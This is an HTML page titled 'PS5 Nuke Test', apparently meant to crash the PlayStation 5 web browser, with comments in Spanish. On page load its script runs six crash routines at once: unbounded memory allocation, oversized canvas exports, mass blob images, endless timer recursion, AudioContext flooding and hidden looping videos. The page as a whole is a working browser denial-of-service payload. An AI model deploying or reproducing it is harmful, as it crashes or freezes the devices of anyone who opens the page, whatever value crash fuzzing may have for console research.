<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>💣 PS5 Nuke</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <h1>💣 PS5 Nuke Test</h1>
  <p>Este test va a intentar colapsar el navegador por múltiples vías.</p>

  <script>
    // 1. Consumo de memoria RAM brutal
    function memoryFlood() {
      const huge = [];
      try {
        while (true) {
          huge.push(new Uint8Array(50_000_000)); // 50 MB por iteración
        }
      } catch (e) {
        console.warn("memoryFlood stopped:", e);
      }
    }

    // 2. Fuzzing con canvas + toDataURL
    function canvasCrash() {
      for (let i = 0; i < 200; i++) {
        const canvas = document.createElement("canvas");
        canvas.width = 9999;
        canvas.height = 9999;
        try {
          const ctx = canvas.getContext("2d");
          ctx.fillRect(0, 0, 10, 10);
          canvas.toDataURL("image/jpeg", 1e9);
        } catch (e) {
          console.warn("canvasCrash error:", e);
        }
      }
    }

    // 3. Fuzzing con Blob + createObjectURL + imágenes
    function blobCrash() {
      for (let i = 0; i < 500; i++) {
        const bytes = new Uint8Array(1024 * 1024); // 1MB
        const blob = new Blob([bytes], { type: "image/jpeg" });
        const url = URL.createObjectURL(blob);
        const img = new Image();
        img.src = url;
        document.body.appendChild(img);
      }
    }

    // 4. Recursión infinita vía setTimeout
    function recursiveCrash(depth = 0) {
      setTimeout(() => recursiveCrash(depth + 1), 0);
      if (depth % 500 === 0) console.log("Profundidad:", depth);
    }

    // 5. AudioContext abuse
    function audioAbuse() {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      for (let i = 0; i < 500; i++) {
        const src = ctx.createBufferSource();
        const buf = ctx.createBuffer(1, 44100, 44100);
        src.buffer = buf;
        src.connect(ctx.destination);
        src.start();
      }
    }

    // 6. Fuzz combinada con videos invisibles
    function videoAbuse() {
      for (let i = 0; i < 200; i++) {
        const vid = document.createElement("video");
        vid.setAttribute("muted", "");
        vid.setAttribute("autoplay", "");
        vid.setAttribute("loop", "");
        vid.setAttribute("playsinline", "");
        vid.src = "data:video/mp4;base64," + btoa("X".repeat(1024));
        vid.style.display = "none";
        document.body.appendChild(vid);
        vid.load();
      }
    }

    // Ejecutar todas las funciones en paralelo
    window.onload = () => {
      setTimeout(memoryFlood, 10);
      setTimeout(canvasCrash, 20);
      setTimeout(blobCrash, 30);
      setTimeout(recursiveCrash, 40);
      setTimeout(audioAbuse, 50);
      setTimeout(videoAbuse, 60);
    };
  </script>
</body>
</html>
